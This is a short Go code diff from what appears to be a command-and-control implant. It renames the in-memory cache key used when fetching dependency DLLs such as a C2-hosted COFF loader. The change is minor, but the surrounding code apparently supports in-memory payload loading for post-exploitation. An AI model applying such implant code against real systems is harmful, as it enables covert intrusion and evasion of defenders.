@@ -69,7 +69,7 @@ func runDLLModule(dllData []byte, invocation def.ResolvedInvocation, token uintp
 // "COFFLoader" still resolves to the C2-hosted "coffloader.<arch>.gz".
 func fetchDependencyDLL(name string) ([]byte, error) {
 	name = strings.ToLower(name)
-	rawKey := "mem:///" + name + ".dll"
+	rawKey := "memfs:///" + name + ".dll"
 	if cached, err := util.ReadFileAgent(rawKey); err == nil && len(cached) > 0 {
 		logging.Debugf("fetchDependencyDLL: hit memfs cache %s", rawKey)
 		return cached, nil
